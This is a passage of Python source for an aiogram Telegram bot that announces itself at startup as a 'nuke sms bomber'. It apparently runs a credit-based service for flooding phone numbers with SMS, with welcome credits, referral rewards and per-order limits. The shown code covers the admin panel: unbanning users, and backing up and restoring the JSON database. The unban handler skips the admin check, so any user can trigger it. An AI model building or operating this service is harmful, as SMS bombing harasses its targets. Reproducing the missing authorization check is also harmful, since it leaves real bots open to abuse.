    rows = [[(sc(f"ᴜɴʙᴀɴ {uid}"), f"admin:unban_do:{uid}", "success", "verify")]
            for uid in banned]
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    text = f"{DIV}\n{ce('blocked')} {B(sc('banned users'))}\n{DIV2}\n{sc('select a user to unban:')}\n{DIV}"
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    try:
        uid = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("invalid!"), show_alert=True)
        return
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
    await cq.answer(f"{uid} unbanned!", show_alert=True)
    await cb_unban(cq)


@R.callback_query(F.data == "admin:db_tools")
async def cb_admin_db_tools(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    text = (
        f"{DIV}\n{ce('tools')} {B(sc('database tools'))}\n{DIV2}\n"
        f"{sc('manage database backups and restores.')}\n{DIV}"
    )
    markup = kb([
        [(sc("ʙᴀᴄᴋᴜᴘ ᴅʙ"), "admin:db_backup", "success", "pin")],
        [(sc("ʀᴇsᴛᴏʀᴇ ᴅʙ"), "admin:db_restore_prompt", "primary", "rocket")],
        [(sc("ʙᴀᴄᴋ"), "admin:panel", "danger", "back")],
    ])
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=markup):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=markup)


@R.callback_query(F.data == "admin:db_backup")
async def cb_admin_db_backup(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    if not os.path.exists(DATA_FILE):
        await cq.answer(sc("database file not found!"), show_alert=True)
        return
    await cq.answer(sc("preparing backup..."))
    try:
        file = FSInputFile(DATA_FILE)
        await cq.bot.send_document(cq.from_user.id, document=file,
                                   caption=sc("database backup"))
    except Exception as e:
        await cq.answer(sc(f"error: {str(e)}"), show_alert=True)


@R.callback_query(F.data == "admin:db_restore_prompt")
async def cb_admin_db_restore_prompt(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    text = (
        f"{DIV}\n{ce('rocket')} {B(sc('restore database'))}\n{DIV2}\n"
        f"{sc('send me a valid')} {C('.json')} {sc('backup file to restore.')}\n"
        f"{It(sc('this will overwrite the current data!'))}\n{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:db_tools")):
        await safe_send(cq.bot, cq.message.chat.id, text,
                        reply_markup=back_button("admin:db_tools"))


@R.message(F.document)
async def handle_db_restore(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    if msg.document.file_name and msg.document.file_name.endswith('.json'):
        path = f"restore_{msg.document.file_unique_id}.json"
        try:
            await msg.bot.download(msg.document.file_id, destination=path)
            with open(path, "r") as f:
                new_data = json.load(f)
            if "admins" in new_data and "firebases" in new_data:
                save(new_data)
                try:
                    os.remove(path)
                except Exception:
                    pass
                await safe_send(msg.bot, msg.chat.id,
                    f"{DIV}\n{ce('verify')} {B(sc('database restored'))}\n{DIV}")
            else:
                try:
                    os.remove(path)
                except Exception:
                    pass
                await safe_send(msg.bot, msg.chat.id, sc("invalid database file!"))
        except Exception as e:
            if os.path.exists(path):
                try:
                    os.remove(path)
                except Exception:
                    pass
            await safe_send(msg.bot, msg.chat.id, sc(f"restore failed: {str(e)}"))


# ════════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    try:
        me = await bot.get_me()
        global _bot_username_cache
        _bot_username_cache = me.username or ""
        log.info(f"✅ @{me.username} started ({VERSION})")
    except Exception as e:
        log.error(f"Failed to fetch bot info: {e}")
        return

    try:
        await safe_send(bot, OWNER_ID,
            f"{DIV}\n"
            f"{ce('bomb')} {B(sc('nuke sms bomber'))} {VERSION}\n"
            f"@{me.username}\n"
            f"{DIV2}\n"
            f"{ce('money')} {sc('welcome bonus')}: {C(str(WELCOME_CREDITS))}\n"
            f"{ce('gift')} {sc('referral reward')}: {C(str(REFERRAL_REWARD))}\n"
            f"{ce('bolt')} {sc('max concurrent')}: {C(str(MAX_CONCURRENT))}\n"
            f"{ce('chart')} {sc('max per order')}: {C(str(MAX_COUNT))}\n"
            f"{ce('star')} {sc('qr available')}: {C('yes' if QR_AVAILABLE else 'no (pip install qrcode[pil])')}\n"
            f"{DIV}")
    except Exception:
        pass

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        await close_session()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user. Goodbye!")